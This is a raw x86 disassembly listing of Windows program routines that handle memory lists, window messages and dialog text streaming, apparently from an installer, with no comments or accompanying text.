  4039c0:	e8 41 22 00 00       	call   0x405c06
  4039c5:	6a 02                	push   $0x2
  4039c7:	ff 15 b0 80 40 00    	call   *0x4080b0
  4039cd:	68 1c 86 40 00       	push   $0x40861c
  4039d2:	53                   	push   %ebx
  4039d3:	e8 82 26 00 00       	call   0x40605a
  4039d8:	be b8 10 4d 00       	mov    $0x4d10b8,%esi
  4039dd:	56                   	push   %esi
  4039de:	53                   	push   %ebx
  4039df:	ff 15 18 81 40 00    	call   *0x408118
  4039e5:	85 c0                	test   %eax,%eax
  4039e7:	74 b9                	je     0x4039a2
  4039e9:	55                   	push   %ebp
  4039ea:	53                   	push   %ebx
  4039eb:	ff 15 84 80 40 00    	call   *0x408084
  4039f1:	53                   	push   %ebx
  4039f2:	ff 15 78 80 40 00    	call   *0x408078
  4039f8:	66 39 2d a8 90 4c 00 	cmp    %bp,0x4c90a8
  4039ff:	75 0b                	jne    0x403a0c
  403a01:	56                   	push   %esi
  403a02:	68 a8 90 4c 00       	push   $0x4c90a8
  403a07:	e8 c3 25 00 00       	call   0x405fcf
  403a0c:	ff 74 24 14          	push   0x14(%esp)
  403a10:	68 00 50 47 00       	push   $0x475000
  403a15:	e8 b5 25 00 00       	call   0x405fcf
  403a1a:	68 18 86 40 00       	push   $0x408618
  403a1f:	68 08 90 47 00       	push   $0x479008
  403a24:	e8 a6 25 00 00       	call   0x405fcf
  403a29:	c7 44 24 14 1a 00 00 	movl   $0x1a,0x14(%esp)
  403a30:	00 
  403a31:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  403a35:	be 00 62 43 00       	mov    $0x436200,%esi
  403a3a:	bf f8 21 43 00       	mov    $0x4321f8,%edi
  403a3f:	a1 dc 45 47 00       	mov    0x4745dc,%eax
  403a44:	ff b0 20 01 00 00    	push   0x120(%eax)
  403a4a:	56                   	push   %esi
  403a4b:	e8 00 2c 00 00       	call   0x406650
  403a50:	56                   	push   %esi
  403a51:	ff 15 70 81 40 00    	call   *0x408170
  403a57:	83 7c 24 18 00       	cmpl   $0x0,0x18(%esp)
  403a5c:	0f 84 eb 00 00 00    	je     0x403b4d
  403a62:	6a 01                	push   $0x1
  403a64:	56                   	push   %esi
  403a65:	68 d8 10 4e 00       	push   $0x4e10d8
  403a6a:	ff 15 ac 80 40 00    	call   *0x4080ac
  403a70:	85 c0                	test   %eax,%eax
  403a72:	0f 84 d5 00 00 00    	je     0x403b4d
  403a78:	6a 00                	push   $0x0
  403a7a:	56                   	push   %esi
  403a7b:	e8 2c 30 00 00       	call   0x406aac
  403a80:	a1 dc 45 47 00       	mov    0x4745dc,%eax
  403a85:	ff b0 24 01 00 00    	push   0x124(%eax)
  403a8b:	56                   	push   %esi
  403a8c:	e8 bf 2b 00 00       	call   0x406650
  403a91:	6a 00                	push   $0x0
  403a93:	56                   	push   %esi
  403a94:	e8 d3 21 00 00       	call   0x405c6c
  403a99:	8b d8                	mov    %eax,%ebx
  403a9b:	eb 16                	jmp    0x403ab3
  403a9d:	6a 04                	push   $0x4
  403a9f:	68 30 86 40 00       	push   $0x408630
  403aa4:	53                   	push   %ebx
  403aa5:	e8 d7 fb ff ff       	call   0x403681
  403aaa:	83 c4 0c             	add    $0xc,%esp
  403aad:	85 c0                	test   %eax,%eax
  403aaf:	74 06                	je     0x403ab7
  403ab1:	4b                   	dec    %ebx
  403ab2:	4b                   	dec    %ebx
  403ab3:	3b de                	cmp    %esi,%ebx
  403ab5:	73 e6                	jae    0x403a9d
  403ab7:	85 db                	test   %ebx,%ebx
  403ab9:	74 71                	je     0x403b2c
  403abb:	81 fb 02 62 43 00    	cmp    $0x436202,%ebx
  403ac1:	76 69                	jbe    0x403b2c
  403ac3:	33 c0                	xor    %eax,%eax
  403ac5:	66 89 43 fe          	mov    %ax,-0x2(%ebx)
  403ac9:	8d 44 24 10          	lea    0x10(%esp),%eax
  403acd:	50                   	push   %eax
  403ace:	ff 15 a8 80 40 00    	call   *0x4080a8
  403ad4:	50                   	push   %eax
  403ad5:	e8 e3 fa ff ff       	call   0x4035bd
  403ada:	85 c0                	test   %eax,%eax
  403adc:	7c 4e                	jl     0x403b2c
  403ade:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  403ae3:	74 47                	je     0x403b2c
  403ae5:	56                   	push   %esi
  403ae6:	57                   	push   %edi
  403ae7:	e8 6e 25 00 00       	call   0x40605a
  403aec:	68 08 86 40 00       	push   $0x408608
  403af1:	57                   	push   %edi
  403af2:	e8 63 25 00 00       	call   0x40605a
  403af7:	6a 1e                	push   $0x1e
  403af9:	8d 44 24 34          	lea    0x34(%esp),%eax
  403afd:	50                   	push   %eax
  403afe:	ff 74 24 18          	push   0x18(%esp)
  403b02:	e8 e4 24 00 00       	call   0x405feb
  403b07:	8d 44 24 30          	lea    0x30(%esp),%eax
  403b0b:	50                   	push   %eax
  403b0c:	57                   	push   %edi
  403b0d:	e8 48 25 00 00       	call   0x40605a
  403b12:	68 04 86 40 00       	push   $0x408604
  403b17:	57                   	push   %edi
  403b18:	e8 3d 25 00 00       	call   0x40605a
  403b1d:	53                   	push   %ebx
  403b1e:	57                   	push   %edi
  403b1f:	e8 36 25 00 00       	call   0x40605a
  403b24:	57                   	push   %edi
  403b25:	e8 7b 20 00 00       	call   0x405ba5
  403b2a:	8b e8                	mov    %eax,%ebp
  403b2c:	85 ed                	test   %ebp,%ebp
  403b2e:	75 0c                	jne    0x403b3c
  403b30:	56                   	push   %esi
  403b31:	e8 6f 20 00 00       	call   0x405ba5
  403b36:	8b e8                	mov    %eax,%ebp
  403b38:	85 ed                	test   %ebp,%ebp
  403b3a:	74 0c                	je     0x403b48
  403b3c:	55                   	push   %ebp
  403b3d:	ff 15 bc 80 40 00    	call   *0x4080bc
  403b43:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  403b48:	bb c8 90 4d 00       	mov    $0x4d90c8,%ebx
  403b4d:	66 ff 05 08 90 47 00 	incw   0x479008
  403b54:	ff 4c 24 14          	decl   0x14(%esp)
  403b58:	0f 85 e1 fe ff ff    	jne    0x403a3f
  403b5e:	6a 00                	push   $0x0
  403b60:	53                   	push   %ebx
  403b61:	e8 46 2f 00 00       	call   0x406aac
  403b66:	33 ed                	xor    %ebp,%ebp
  403b68:	e9 35 fe ff ff       	jmp    0x4039a2
  403b6d:	39 2d 94 46 47 00    	cmp    %ebp,0x474694
  403b73:	74 7b                	je     0x403bf0
  403b75:	6a 03                	push   $0x3
  403b77:	e8 c9 25 00 00       	call   0x406145
  403b7c:	6a 04                	push   $0x4
  403b7e:	8b d8                	mov    %eax,%ebx
  403b80:	e8 c0 25 00 00       	call   0x406145
  403b85:	6a 05                	push   $0x5
  403b87:	8b f0                	mov    %eax,%esi
  403b89:	e8 b7 25 00 00       	call   0x406145
  403b8e:	8b f8                	mov    %eax,%edi
  403b90:	3b dd                	cmp    %ebp,%ebx
  403b92:	74 48                	je     0x403bdc
  403b94:	3b f5                	cmp    %ebp,%esi
  403b96:	74 44                	je     0x403bdc
  403b98:	3b fd                	cmp    %ebp,%edi
  403b9a:	74 40                	je     0x403bdc
  403b9c:	8d 44 24 14          	lea    0x14(%esp),%eax
  403ba0:	50                   	push   %eax
  403ba1:	6a 28                	push   $0x28
  403ba3:	ff 15 a4 80 40 00    	call   *0x4080a4
  403ba9:	50                   	push   %eax
  403baa:	ff d3                	call   *%ebx
  403bac:	85 c0                	test   %eax,%eax
  403bae:	74 2c                	je     0x403bdc
  403bb0:	8d 44 24 24          	lea    0x24(%esp),%eax
  403bb4:	50                   	push   %eax
  403bb5:	68 dc 85 40 00       	push   $0x4085dc
  403bba:	55                   	push   %ebp
  403bbb:	ff d6                	call   *%esi
  403bbd:	55                   	push   %ebp
  403bbe:	55                   	push   %ebp
  403bbf:	55                   	push   %ebp
  403bc0:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403bc4:	50                   	push   %eax
  403bc5:	55                   	push   %ebp
  403bc6:	ff 74 24 28          	push   0x28(%esp)
  403bca:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  403bd1:	00 
  403bd2:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%esp)
  403bd9:	00 
  403bda:	ff d7                	call   *%edi
  403bdc:	55                   	push   %ebp
  403bdd:	6a 02                	push   $0x2
  403bdf:	ff 15 5c 82 40 00    	call   *0x40825c
  403be5:	85 c0                	test   %eax,%eax
  403be7:	75 07                	jne    0x403bf0
  403be9:	6a 09                	push   $0x9
  403beb:	e8 ed d8 ff ff       	call   0x4014dd
  403bf0:	a1 ac 46 47 00       	mov    0x4746ac,%eax
  403bf5:	83 f8 ff             	cmp    $0xffffffff,%eax
  403bf8:	74 04                	je     0x403bfe
  403bfa:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403bfe:	ff 74 24 1c          	push   0x1c(%esp)
  403c02:	e9 c0 fd ff ff       	jmp    0x4039c7
  403c07:	56                   	push   %esi
  403c08:	8b 35 14 a2 43 00    	mov    0x43a214,%esi
  403c0e:	eb 0a                	jmp    0x403c1a
  403c10:	ff 74 24 08          	push   0x8(%esp)
  403c14:	ff 56 04             	call   *0x4(%esi)
  403c17:	8b 36                	mov    (%esi),%esi
  403c19:	59                   	pop    %ecx
  403c1a:	85 f6                	test   %esi,%esi
  403c1c:	75 f2                	jne    0x403c10
  403c1e:	5e                   	pop    %esi
  403c1f:	c2 04 00             	ret    $0x4
  403c22:	56                   	push   %esi
  403c23:	8b 35 14 a2 43 00    	mov    0x43a214,%esi
  403c29:	6a 00                	push   $0x0
  403c2b:	e8 d7 ff ff ff       	call   0x403c07
  403c30:	85 f6                	test   %esi,%esi
  403c32:	74 1a                	je     0x403c4e
  403c34:	57                   	push   %edi
  403c35:	8b fe                	mov    %esi,%edi
  403c37:	ff 77 08             	push   0x8(%edi)
  403c3a:	8b 36                	mov    (%esi),%esi
  403c3c:	ff 15 3c 81 40 00    	call   *0x40813c
  403c42:	57                   	push   %edi
  403c43:	ff 15 30 81 40 00    	call   *0x408130
  403c49:	85 f6                	test   %esi,%esi
  403c4b:	75 e8                	jne    0x403c35
  403c4d:	5f                   	pop    %edi
  403c4e:	83 25 14 a2 43 00 00 	andl   $0x0,0x43a214
  403c55:	5e                   	pop    %esi
  403c56:	c3                   	ret
  403c57:	a1 14 a2 43 00       	mov    0x43a214,%eax
  403c5c:	eb 0b                	jmp    0x403c69
  403c5e:	8b 48 08             	mov    0x8(%eax),%ecx
  403c61:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403c65:	74 0a                	je     0x403c71
  403c67:	8b 00                	mov    (%eax),%eax
  403c69:	85 c0                	test   %eax,%eax
  403c6b:	75 f1                	jne    0x403c5e
  403c6d:	40                   	inc    %eax
  403c6e:	c2 04 00             	ret    $0x4
  403c71:	33 c0                	xor    %eax,%eax
  403c73:	eb f9                	jmp    0x403c6e
  403c75:	56                   	push   %esi
  403c76:	8b 74 24 08          	mov    0x8(%esp),%esi
  403c7a:	56                   	push   %esi
  403c7b:	e8 d7 ff ff ff       	call   0x403c57
  403c80:	85 c0                	test   %eax,%eax
  403c82:	75 03                	jne    0x403c87
  403c84:	40                   	inc    %eax
  403c85:	eb 2c                	jmp    0x403cb3
  403c87:	6a 0c                	push   $0xc
  403c89:	6a 40                	push   $0x40
  403c8b:	ff 15 24 81 40 00    	call   *0x408124
  403c91:	85 c0                	test   %eax,%eax
  403c93:	74 1b                	je     0x403cb0
  403c95:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403c99:	89 48 04             	mov    %ecx,0x4(%eax)
  403c9c:	8b 0d 14 a2 43 00    	mov    0x43a214,%ecx
  403ca2:	89 70 08             	mov    %esi,0x8(%eax)
  403ca5:	89 08                	mov    %ecx,(%eax)
  403ca7:	a3 14 a2 43 00       	mov    %eax,0x43a214
  403cac:	33 c0                	xor    %eax,%eax
  403cae:	eb 03                	jmp    0x403cb3
  403cb0:	83 c8 ff             	or     $0xffffffff,%eax
  403cb3:	5e                   	pop    %esi
  403cb4:	c2 08 00             	ret    $0x8
  403cb7:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  403cbc:	75 06                	jne    0x403cc4
  403cbe:	ff 05 94 c5 46 00    	incl   0x46c594
  403cc4:	6a 00                	push   $0x0
  403cc6:	ff 74 24 08          	push   0x8(%esp)
  403cca:	68 08 04 00 00       	push   $0x408
  403ccf:	ff 35 d4 45 47 00    	push   0x4745d4
  403cd5:	ff 15 7c 82 40 00    	call   *0x40827c
  403cdb:	c2 04 00             	ret    $0x4
  403cde:	ff 74 24 0c          	push   0xc(%esp)
  403ce2:	6a 00                	push   $0x0
  403ce4:	e8 67 29 00 00       	call   0x406650
  403ce9:	50                   	push   %eax
  403cea:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403cee:	05 e8 03 00 00       	add    $0x3e8,%eax
  403cf3:	50                   	push   %eax
  403cf4:	ff 74 24 0c          	push   0xc(%esp)
  403cf8:	e8 e7 1e 00 00       	call   0x405be4
  403cfd:	c2 0c 00             	ret    $0xc
  403d00:	83 3d 8c 46 47 00 00 	cmpl   $0x0,0x47468c
  403d07:	a1 34 e2 43 00       	mov    0x43e234,%eax
  403d0c:	75 05                	jne    0x403d13
  403d0e:	a1 44 e2 43 00       	mov    0x43e244,%eax
  403d13:	6a 01                	push   $0x1
  403d15:	6a 01                	push   $0x1
  403d17:	68 f4 00 00 00       	push   $0xf4
  403d1c:	50                   	push   %eax
  403d1d:	ff 15 7c 82 40 00    	call   *0x40827c
  403d23:	c3                   	ret
  403d24:	ff 74 24 04          	push   0x4(%esp)
  403d28:	ff 35 44 e2 43 00    	push   0x43e244
  403d2e:	ff 15 74 82 40 00    	call   *0x408274
  403d34:	c2 04 00             	ret    $0x4
  403d37:	6a 01                	push   $0x1
  403d39:	ff 74 24 08          	push   0x8(%esp)
  403d3d:	6a 28                	push   $0x28
  403d3f:	ff 35 d4 45 47 00    	push   0x4745d4
  403d45:	ff 15 7c 82 40 00    	call   *0x40827c
  403d4b:	c2 04 00             	ret    $0x4
  403d4e:	a1 88 c5 46 00       	mov    0x46c588,%eax
  403d53:	85 c0                	test   %eax,%eax
  403d55:	74 0f                	je     0x403d66
  403d57:	6a 00                	push   $0x0
  403d59:	6a 00                	push   $0x0
  403d5b:	ff 74 24 0c          	push   0xc(%esp)
  403d5f:	50                   	push   %eax
  403d60:	ff 15 7c 82 40 00    	call   *0x40827c
  403d66:	c2 04 00             	ret    $0x4
  403d69:	55                   	push   %ebp
  403d6a:	8b ec                	mov    %esp,%ebp
  403d6c:	83 ec 0c             	sub    $0xc,%esp
  403d6f:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  403d74:	56                   	push   %esi
  403d75:	83 f8 05             	cmp    $0x5,%eax
  403d78:	0f 87 8e 00 00 00    	ja     0x403e0c
  403d7e:	6a eb                	push   $0xffffffeb
  403d80:	ff 75 0c             	push   0xc(%ebp)
  403d83:	ff 15 4c 82 40 00    	call   *0x40824c
  403d89:	8b f0                	mov    %eax,%esi
  403d8b:	85 f6                	test   %esi,%esi
  403d8d:	74 7d                	je     0x403e0c
  403d8f:	f6 46 14 02          	testb  $0x2,0x14(%esi)
  403d93:	8b 06                	mov    (%esi),%eax
  403d95:	57                   	push   %edi
  403d96:	8b 3d 50 82 40 00    	mov    0x408250,%edi
  403d9c:	74 03                	je     0x403da1
  403d9e:	50                   	push   %eax
  403d9f:	ff d7                	call   *%edi
  403da1:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  403da5:	74 0a                	je     0x403db1
  403da7:	50                   	push   %eax
  403da8:	ff 75 08             	push   0x8(%ebp)
  403dab:	ff 15 54 80 40 00    	call   *0x408054
  403db1:	ff 76 10             	push   0x10(%esi)
  403db4:	ff 75 08             	push   0x8(%ebp)
  403db7:	ff 15 50 80 40 00    	call   *0x408050
  403dbd:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  403dc1:	8b 46 04             	mov    0x4(%esi),%eax
  403dc4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403dc7:	74 06                	je     0x403dcf
  403dc9:	50                   	push   %eax
  403dca:	ff d7                	call   *%edi
  403dcc:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403dcf:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  403dd3:	5f                   	pop    %edi
  403dd4:	74 0a                	je     0x403de0
  403dd6:	50                   	push   %eax
  403dd7:	ff 75 08             	push   0x8(%ebp)
  403dda:	ff 15 3c 80 40 00    	call   *0x40803c
  403de0:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  403de4:	74 21                	je     0x403e07
  403de6:	8b 46 08             	mov    0x8(%esi),%eax
  403de9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403dec:	8b 46 0c             	mov    0xc(%esi),%eax
  403def:	85 c0                	test   %eax,%eax
  403df1:	74 07                	je     0x403dfa
  403df3:	50                   	push   %eax
  403df4:	ff 15 44 80 40 00    	call   *0x408044
  403dfa:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403dfd:	50                   	push   %eax
  403dfe:	ff 15 48 80 40 00    	call   *0x408048
  403e04:	89 46 0c             	mov    %eax,0xc(%esi)
  403e07:	8b 46 0c             	mov    0xc(%esi),%eax
  403e0a:	eb 02                	jmp    0x403e0e
  403e0c:	33 c0                	xor    %eax,%eax
  403e0e:	5e                   	pop    %esi
  403e0f:	c9                   	leave
  403e10:	c2 08 00             	ret    $0x8
  403e13:	53                   	push   %ebx
  403e14:	55                   	push   %ebp
  403e15:	56                   	push   %esi
  403e16:	57                   	push   %edi
  403e17:	bf c0 50 4d 00       	mov    $0x4d50c0,%edi
  403e1c:	57                   	push   %edi
  403e1d:	be ff ff 00 00       	mov    $0xffff,%esi
  403e22:	e8 08 21 00 00       	call   0x405f2f
  403e27:	0f b7 d8             	movzwl %ax,%ebx
  403e2a:	8b 0d 04 46 47 00    	mov    0x474604,%ecx
  403e30:	85 c9                	test   %ecx,%ecx
  403e32:	74 42                	je     0x403e76
  403e34:	a1 dc 45 47 00       	mov    0x4745dc,%eax
  403e39:	8b 40 64             	mov    0x64(%eax),%eax
  403e3c:	8b d0                	mov    %eax,%edx
  403e3e:	0f af c1             	imul   %ecx,%eax
  403e41:	f7 da                	neg    %edx
  403e43:	03 05 00 46 47 00    	add    0x474600,%eax
  403e49:	03 c2                	add    %edx,%eax
  403e4b:	66 8b 28             	mov    (%eax),%bp
  403e4e:	66 33 eb             	xor    %bx,%bp
  403e51:	49                   	dec    %ecx
  403e52:	66 85 ee             	test   %bp,%si
  403e55:	74 06                	je     0x403e5d
  403e57:	85 c9                	test   %ecx,%ecx
  403e59:	75 ee                	jne    0x403e49
  403e5b:	eb 19                	jmp    0x403e76
  403e5d:	8b 48 02             	mov    0x2(%eax),%ecx
  403e60:	89 0d 9c c5 46 00    	mov    %ecx,0x46c59c
  403e66:	8b 48 06             	mov    0x6(%eax),%ecx
  403e69:	89 0d a8 46 47 00    	mov    %ecx,0x4746a8
  403e6f:	8d 48 0a             	lea    0xa(%eax),%ecx
  403e72:	85 c9                	test   %ecx,%ecx
  403e74:	75 15                	jne    0x403e8b
  403e76:	b8 ff ff 00 00       	mov    $0xffff,%eax
  403e7b:	66 3b f0             	cmp    %ax,%si
  403e7e:	75 07                	jne    0x403e87
  403e80:	be ff 03 00 00       	mov    $0x3ff,%esi
  403e85:	eb a3                	jmp    0x403e2a
  403e87:	33 f6                	xor    %esi,%esi
  403e89:	eb 9f                	jmp    0x403e2a
  403e8b:	89 0d a8 c5 46 00    	mov    %ecx,0x46c5a8
  403e91:	0f b7 00             	movzwl (%eax),%eax
  403e94:	50                   	push   %eax
  403e95:	57                   	push   %edi
  403e96:	e8 7b 20 00 00       	call   0x405f16
  403e9b:	6a fe                	push   $0xfffffffe
  403e9d:	68 c0 c5 46 00       	push   $0x46c5c0
  403ea2:	e8 a9 27 00 00       	call   0x406650
  403ea7:	50                   	push   %eax
  403ea8:	ff 35 40 e2 43 00    	push   0x43e240
  403eae:	ff 15 2c 82 40 00    	call   *0x40822c
  403eb4:	8b 35 e8 45 47 00    	mov    0x4745e8,%esi
  403eba:	8b 3d ec 45 47 00    	mov    0x4745ec,%edi
  403ec0:	eb 17                	jmp    0x403ed9
  403ec2:	8b 06                	mov    (%esi),%eax
  403ec4:	4f                   	dec    %edi
  403ec5:	85 c0                	test   %eax,%eax
  403ec7:	74 0a                	je     0x403ed3
  403ec9:	50                   	push   %eax
  403eca:	8d 46 18             	lea    0x18(%esi),%eax
  403ecd:	50                   	push   %eax
  403ece:	e8 7d 27 00 00       	call   0x406650
  403ed3:	81 c6 20 40 00 00    	add    $0x4020,%esi
  403ed9:	85 ff                	test   %edi,%edi
  403edb:	75 e5                	jne    0x403ec2
  403edd:	5f                   	pop    %edi
  403ede:	5e                   	pop    %esi
  403edf:	5d                   	pop    %ebp
  403ee0:	5b                   	pop    %ebx
  403ee1:	c3                   	ret
  403ee2:	55                   	push   %ebp
  403ee3:	8b ec                	mov    %esp,%ebp
  403ee5:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  403ee9:	56                   	push   %esi
  403eea:	8b 35 7c 82 40 00    	mov    0x40827c,%esi
  403ef0:	75 1c                	jne    0x403f0e
  403ef2:	ff 75 14             	push   0x14(%ebp)
  403ef5:	68 fb 03 00 00       	push   $0x3fb
  403efa:	e8 eb 1c 00 00       	call   0x405bea
  403eff:	ff 75 14             	push   0x14(%ebp)
  403f02:	6a 01                	push   $0x1
  403f04:	68 67 04 00 00       	push   $0x467
  403f09:	ff 75 08             	push   0x8(%ebp)
  403f0c:	ff d6                	call   *%esi
  403f0e:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  403f12:	75 2d                	jne    0x403f41
  403f14:	ff 75 14             	push   0x14(%ebp)
  403f17:	ff 75 10             	push   0x10(%ebp)
  403f1a:	ff 15 80 81 40 00    	call   *0x408180
  403f20:	85 c0                	test   %eax,%eax
  403f22:	74 0e                	je     0x403f32
  403f24:	6a 07                	push   $0x7
  403f26:	e8 b2 d5 ff ff       	call   0x4014dd
  403f2b:	85 c0                	test   %eax,%eax
  403f2d:	75 03                	jne    0x403f32
  403f2f:	40                   	inc    %eax
  403f30:	eb 02                	jmp    0x403f34
  403f32:	33 c0                	xor    %eax,%eax
  403f34:	50                   	push   %eax
  403f35:	6a 00                	push   $0x0
  403f37:	68 65 04 00 00       	push   $0x465
  403f3c:	ff 75 08             	push   0x8(%ebp)
  403f3f:	ff d6                	call   *%esi
  403f41:	33 c0                	xor    %eax,%eax
  403f43:	5e                   	pop    %esi
  403f44:	5d                   	pop    %ebp
  403f45:	c2 10 00             	ret    $0x10
  403f48:	53                   	push   %ebx
  403f49:	8b 1d 48 81 40 00    	mov    0x408148,%ebx
  403f4f:	55                   	push   %ebp
  403f50:	56                   	push   %esi
  403f51:	33 f6                	xor    %esi,%esi
  403f53:	56                   	push   %esi
  403f54:	56                   	push   %esi
  403f55:	56                   	push   %esi
  403f56:	56                   	push   %esi
  403f57:	6a ff                	push   $0xffffffff
  403f59:	ff 74 24 24          	push   0x24(%esp)
  403f5d:	56                   	push   %esi
  403f5e:	56                   	push   %esi
  403f5f:	ff d3                	call   *%ebx
  403f61:	33 ed                	xor    %ebp,%ebp
  403f63:	3b c6                	cmp    %esi,%eax
  403f65:	74 1e                	je     0x403f85
  403f67:	57                   	push   %edi
  403f68:	8d 78 01             	lea    0x1(%eax),%edi
  403f6b:	57                   	push   %edi
  403f6c:	6a 40                	push   $0x40
  403f6e:	ff 15 24 81 40 00    	call   *0x408124
  403f74:	56                   	push   %esi
  403f75:	56                   	push   %esi
  403f76:	57                   	push   %edi
  403f77:	8b e8                	mov    %eax,%ebp
  403f79:	55                   	push   %ebp
  403f7a:	6a ff                	push   $0xffffffff
  403f7c:	ff 74 24 28          	push   0x28(%esp)
  403f80:	56                   	push   %esi
  403f81:	56                   	push   %esi
  403f82:	ff d3                	call   *%ebx
  403f84:	5f                   	pop    %edi
  403f85:	5e                   	pop    %esi
  403f86:	8b c5                	mov    %ebp,%eax
  403f88:	5d                   	pop    %ebp
  403f89:	5b                   	pop    %ebx
  403f8a:	c3                   	ret
  403f8b:	55                   	push   %ebp
  403f8c:	8b ec                	mov    %esp,%ebp
  403f8e:	83 3d 84 a2 45 00 00 	cmpl   $0x0,0x45a284
  403f95:	56                   	push   %esi
  403f96:	75 50                	jne    0x403fe8
  403f98:	ff 75 10             	push   0x10(%ebp)
  403f9b:	a1 18 a2 43 00       	mov    0x43a218,%eax
  403fa0:	8b 75 08             	mov    0x8(%ebp),%esi
  403fa3:	03 c6                	add    %esi,%eax
  403fa5:	50                   	push   %eax
  403fa6:	ff 75 0c             	push   0xc(%ebp)
  403fa9:	ff 15 c4 80 40 00    	call   *0x4080c4
  403faf:	ff 75 0c             	push   0xc(%ebp)
  403fb2:	ff 15 50 81 40 00    	call   *0x408150
  403fb8:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403fbb:	01 05 18 a2 43 00    	add    %eax,0x43a218
  403fc1:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403fc5:	89 01                	mov    %eax,(%ecx)
  403fc7:	7e 25                	jle    0x403fee
  403fc9:	85 c0                	test   %eax,%eax
  403fcb:	75 21                	jne    0x403fee
  403fcd:	39 05 30 e2 43 00    	cmp    %eax,0x43e230
  403fd3:	74 19                	je     0x403fee
  403fd5:	56                   	push   %esi
  403fd6:	ff 15 30 81 40 00    	call   *0x408130
  403fdc:	c7 05 84 a2 45 00 01 	movl   $0x1,0x45a284
  403fe3:	00 00 00 
  403fe6:	eb 06                	jmp    0x403fee
  403fe8:	8b 45 14             	mov    0x14(%ebp),%eax
  403feb:	83 20 00             	andl   $0x0,(%eax)
  403fee:	33 c0                	xor    %eax,%eax
  403ff0:	5e                   	pop    %esi
  403ff1:	5d                   	pop    %ebp
  403ff2:	c2 10 00             	ret    $0x10
  403ff5:	55                   	push   %ebp
  403ff6:	8b ec                	mov    %esp,%ebp
  403ff8:	8b 45 10             	mov    0x10(%ebp),%eax
  403ffb:	d1 e8                	shr    $1,%eax
  403ffd:	75 03                	jne    0x404002
  403fff:	33 c0                	xor    %eax,%eax
  404001:	40                   	inc    %eax
  404002:	8b 0d 18 a2 43 00    	mov    0x43a218,%ecx
  404008:	50                   	push   %eax
  404009:	8b 45 08             	mov    0x8(%ebp),%eax
  40400c:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  40400f:	50                   	push   %eax
  404010:	ff 75 0c             	push   0xc(%ebp)
  404013:	ff 15 cc 80 40 00    	call   *0x4080cc
  404019:	ff 75 0c             	push   0xc(%ebp)
  40401c:	ff 15 c8 80 40 00    	call   *0x4080c8
  404022:	8b 55 14             	mov    0x14(%ebp),%edx
  404025:	01 05 18 a2 43 00    	add    %eax,0x43a218
  40402b:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  40402e:	89 0a                	mov    %ecx,(%edx)
  404030:	33 c0                	xor    %eax,%eax
  404032:	5d                   	pop    %ebp
  404033:	c2 10 00             	ret    $0x10
  404036:	55                   	push   %ebp
  404037:	8b ec                	mov    %esp,%ebp
  404039:	83 ec 18             	sub    $0x18,%esp
  40403c:	53                   	push   %ebx
  40403d:	33 db                	xor    %ebx,%ebx
  40403f:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404046:	56                   	push   %esi
  404047:	57                   	push   %edi
  404048:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40404b:	0f 85 2d 01 00 00    	jne    0x40417e
  404051:	8b 7d 14             	mov    0x14(%ebp),%edi
  404054:	8b 47 30             	mov    0x30(%edi),%eax
  404057:	3b c3                	cmp    %ebx,%eax
  404059:	7d 11                	jge    0x40406c
  40405b:	8b 0d a8 c5 46 00    	mov    0x46c5a8,%ecx
  404061:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  404068:	2b c8                	sub    %eax,%ecx
  40406a:	8b 01                	mov    (%ecx),%eax
  40406c:	8b 0d f8 45 47 00    	mov    0x4745f8,%ecx
  404072:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  404075:	0f b7 08             	movzwl (%eax),%ecx
  404078:	40                   	inc    %eax
  404079:	40                   	inc    %eax
  40407a:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40407d:	89 1d 84 a2 45 00    	mov    %ebx,0x45a284
  404083:	89 45 14             	mov    %eax,0x14(%ebp)
  404086:	f6 c1 10             	test   $0x10,%cl
  404089:	74 09                	je     0x404094
  40408b:	c7 45 fc f5 3f 40 00 	movl   $0x403ff5,-0x4(%ebp)
  404092:	eb 18                	jmp    0x4040ac
  404094:	50                   	push   %eax
  404095:	c7 45 fc 8b 3f 40 00 	movl   $0x403f8b,-0x4(%ebp)
  40409c:	e8 a7 fe ff ff       	call   0x403f48
  4040a1:	59                   	pop    %ecx
  4040a2:	c7 05 30 e2 43 00 01 	movl   $0x1,0x43e230
  4040a9:	00 00 00 
  4040ac:	ff 77 34             	push   0x34(%edi)
  4040af:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4040b2:	8b 47 14             	mov    0x14(%edi),%eax
  4040b5:	8b f0                	mov    %eax,%esi
  4040b7:	c1 ee 05             	shr    $0x5,%esi
  4040ba:	f7 d6                	not    %esi
  4040bc:	6a 22                	push   $0x22
  4040be:	ff 75 08             	push   0x8(%ebp)
  4040c1:	0b f0                	or     %eax,%esi
  4040c3:	83 e6 01             	and    $0x1,%esi
  4040c6:	e8 13 fc ff ff       	call   0x403cde
  4040cb:	ff 77 38             	push   0x38(%edi)
  4040ce:	6a 23                	push   $0x23
  4040d0:	ff 75 08             	push   0x8(%ebp)
  4040d3:	e8 06 fc ff ff       	call   0x403cde
